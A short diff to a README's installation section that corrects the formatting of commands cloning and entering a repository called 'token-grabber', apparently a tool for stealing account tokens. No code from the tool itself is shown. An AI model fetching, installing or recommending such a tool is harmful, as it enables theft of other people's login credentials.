@@ -19,8 +19,8 @@ If you do not agree with these terms, **DO NOT USE THIS TOOL**.
 
 1. **Clone or Download the Repository**
    ```bash
-   git clone <https://github.com/lazysisu/token-grabber>```
-   cd <token-grabber>```
+   git clone <https://github.com/lazysisu/token-grabber>
+   cd token-grabber```
 
 3. **Install Dependencies**
    ```bash
